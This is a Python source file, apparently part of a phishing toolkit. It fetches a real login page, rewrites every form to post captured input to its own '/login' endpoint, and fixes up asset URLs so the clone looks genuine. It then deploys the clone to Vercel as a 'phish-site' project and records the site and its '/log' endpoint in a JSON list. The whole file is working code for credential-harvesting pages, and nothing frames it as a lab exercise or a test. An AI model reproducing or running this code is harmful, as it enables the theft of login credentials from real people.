import json
import requests
import datetime
import subprocess
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from constants import LOG_FILE_PATH, REQ_HEADERS, TEMPLATE_FILE_PATH, VERCEL_DEPLOY_CMD


def generate_phishing_page(login_url):
    # Replace <login_page_url> with the actual login page URL
    base_url = "/".join(login_url.split("/")[:-1])

    # Create a session
    session = requests.Session()

    # Set the headers for the session
    session.headers.update(REQ_HEADERS)

    # Get the login page HTML
    response = session.get(login_url)
    html = response.content

    # Filter out '{{' and '}}' characters from the HTML string that conflict with JINJA
    html = response.content.decode('utf-8')
    html = html.replace('{{', '').replace('}}', '')

    # Parse the HTML using BeautifulSoup
    soup = BeautifulSoup(html, "html.parser")

    # Find all the forms in the HTML
    forms = soup.find_all("form")

    # Edit the forms to add the method and action attributes
    for form in forms:
        form["id"] = "phishpipeline"
        form["method"] = "post"
        form["action"] = "/login"
        # Find all the buttons or input type=submit elements within the form
        buttons = form.find_all("button") + \
            form.find_all("input", {"type": "submit"})

        # Edit the buttons to add the ID attribute
        for button in buttons:
            button["id"] = "phishpipeline"

    # Find all the assets (images, CSS, and JavaScript) in the HTML
    assets = soup.find_all(["img", "link", "style", "script"])
    style_tags = soup.find_all(lambda tag: tag.has_attr('style'))

    # Resolve the URLs of the assets
    for asset in assets:
        if asset.has_attr("src") and not asset["src"].startswith(('http://', 'https://', '//')):
            #asset["src"] = urljoin(base_url, asset["src"])
            parsed_url = urlparse(base_url)
            base_url2 = f"{parsed_url.scheme}://{parsed_url.netloc}"
            try:
                response1 = session.get(base_url + '/' + asset["src"])
                if response1.status_code == 200:
                    asset["src"] = base_url + '/' + asset["src"]
                else:
                    try:
                        response2 = session.get(
                            base_url2 + '/' + asset["src"])
                        asset["src"] = base_url2 + '/' + asset["src"]
                    except:
                        print("The asset at {0} is unavailable.",
                              base_url2 + '/' + asset["src"])
            except:
                try:
                    response2 = session.get(base_url2 + '/' + asset["src"])
                    asset["src"] = base_url2 + '/' + asset["src"]
                except:
                    print("The asset at {0} is unavailable.",
                          base_url2 + '/' + asset["src"])
        elif asset.has_attr("href") and not asset["href"].startswith(('http://', 'https://', '//')):
            #asset["href"] = urljoin(base_url, asset["href"])
            asset["href"] = base_url + '/' + asset["href"]

    # Resolve the URLs of the assets in the style attribute
    for style_tag in style_tags:
        style = style_tag['style']
        start_index = style.find('url(') + 4
        end_index = style.find(')', start_index)
        url_value = style[start_index:end_index]
        if not url_value.startswith(('http://', 'https://', '//')):
            url_value = urljoin(base_url, url_value.replace('\\', '/'))
        if url_value.startswith('http:/'):
            url_value = url_value.replace('http:/', 'http://')
        if url_value.startswith('https:/'):
            url_value = url_value.replace('https:/', 'https://')
        style_tag['style'] = style[:start_index] + \
            url_value + style[end_index:]

    # Save the updated HTML to a new file
    with open(TEMPLATE_FILE_PATH, "w", encoding="utf-8") as f:
        f.write(str(soup))

    with open(LOG_FILE_PATH, 'w') as f:
        f.write('')


def deploy_phishing_page(result):
    import re
    import time
    import os
    import shutil
    
    # Delete .vercel directory to force a new project creation
    vercel_dir = 'build/.vercel'
    if os.path.exists(vercel_dir):
        shutil.rmtree(vercel_dir)
    
    # Generate unique project name
    timestamp = str(int(time.time()))
    project_name = f"phish-site-{timestamp}"
    
    # Deploy with new project name
    deploy_cmd = f"vercel deploy --prod --cwd build --yes --name {project_name}"
    output = subprocess.check_output(deploy_cmd, shell=True)
    output = output.decode()
    
    print(output)
    
    # Extract the domain URL (format: project-name-hash.vercel.app or project-name.vercel.app)
    # Look for the production domain in the output
    domain_pattern = r'https://([a-z0-9-]+\.vercel\.app)'
    matches = re.findall(domain_pattern, output)
    
    if matches:
        # Get the domain (not the deployment URL)
        domain = matches[-1]  # Last match is usually the production domain
        url = f"https://{domain}"
    else:
        # Fallback: extract any vercel URL
        url_start = output.find("https://")
        url_end = output.find("\n", url_start)
        url = output[url_start:url_end].strip()
    
    # Add the newly deployed site's entry to the sites.json db
    try:
        with open('sites.json', 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = []

    new_site = {
        "id": len(data) + 1,
        "url": url,
        "log_url": f"{url}/log",
        "creation_date": str(datetime.date.today()),
        "project_name": project_name
    }

    data.append(new_site)

    with open('sites.json', 'w') as f:
        json.dump(data, f, indent=2)

    # Return the deployment URL
    result.append(url)
    return url
